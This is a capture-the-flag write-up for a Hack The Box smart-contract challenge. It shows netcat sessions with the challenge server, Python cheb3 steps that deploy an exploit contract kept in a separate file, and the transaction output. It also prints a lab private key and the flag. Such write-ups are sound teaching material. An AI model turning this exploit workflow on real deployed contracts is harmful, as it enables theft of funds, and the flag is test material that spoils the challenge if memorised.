# The Art of Deception

## Description

Your cyborg abilities are not always the most effective tools for achieving your goals. Sometimes, you need to go unnoticed and blend in with your surroundings. To achieve this, you must learn to assume new identities and blend in with different groups of people. Mastering the art of deception requires subtlety, observation, and the ability to read people's motivations and intentions. After completing this training, you will emerge as a skilled infiltrator, capable of seamlessly blending in with your surroundings and achieving your objectives with stealth and subtlety. Can you bypass the High Security Gate and sneak into the Fortified Perimeter?

## Attachment

[Contracts](./challenge/)
Private Endpoint: http://159.65.81.51:32715
Netcat: 159.65.81.51:30777

## Use `cheb3`

1. We analyzed the given contracts and wrote our exploit script: [Entrant.sol](./Entrant.sol)

2. Netcat connect to the server and get wallet and deployment address:

```sh
$ nc 159.65.81.51 30777
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 1

Private key     :  0x7ab624cdb2fe009c445fa900000cca9909c141adc3b6c94eee879dc44076fbbe
Address         :  0xCC0fF71dDd358601B32864A4CDCe47061481A96f
Target contract :  0x6ef44a1fFb2591A350bd29426B0F347eCC99CD1F
Setup contract  :  0xc4fCcc5755D3f095521A7c9646b9d408EaC09d52
```

3. Use `cheb3` to create the account

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_file
>>> 
>>> conn = Connection("http://159.65.81.51:32715")
>>> account = conn.account("0x7ab624cdb2fe009c445fa900000cca9909c141adc3b6c94eee879dc44076fbbe")
```

4. Create and deploy the exploit contract

```py
>>> entrant_abi, entrant_bytecode = compile_file("Entrant.sol", "Entrant", "0.8.18")['Entrant']
>>> entrant_contract = conn.contract(account, abi=entrant_abi, bytecode=entrant_bytecode)
>>> entrant_contract.deploy()
```

Output:

```sh
2023-03-19 21:04:20.859 | DEBUG    | cheb3.contract:deploy:65 - Deploying Contract ...
2023-03-19 21:04:21.458 | INFO     | cheb3.contract:deploy:70 - Deployed Contract at 0xe0741F871fd097F55EBA005A80f36eFa16c517bA
```

5. Send transaction and interact with target contract

```py
>>> target_address = "0x6ef44a1fFb2591A350bd29426B0F347eCC99CD1F"
>>> entrant_contract.functions.exploit(target_address).send_transaction()
```

Output:

```sh
2023-03-19 21:04:30.908 | INFO     | cheb3.contract:send_transaction:144 - (0xe0741F871fd097F55EBA005A80f36eFa16c517bA).exploit transaction hash: 0xac02301fc71f9c0df485594070d1c1686ec2999164b8d385fd294585a1285be7
AttributeDict({'transactionHash': HexBytes('0xac02301fc71f9c0df485594070d1c1686ec2999164b8d385fd294585a1285be7'), 'transactionIndex': 0, 'blockHash': HexBytes('0xb1d227910681478df0b664b69cdcf430b1a4cb741ed60d9e3a6cd9d18e648631'), 'blockNumber': 3, 'from': '0xCC0fF71dDd358601B32864A4CDCe47061481A96f', 'to': '0xe0741F871fd097F55EBA005A80f36eFa16c517bA', 'cumulativeGasUsed': 82641, 'gasUsed': 82641, 'contractAddress': None, 'logs': [], 'status': 1, 'logsBloom': HexBytes('0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'), 'effectiveGasPrice': 1000000000})
```

6. Get flag

```sh
$ nc 159.65.81.51 30777
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 3
HTB{H1D1n9_1n_PL41n_519H7}
```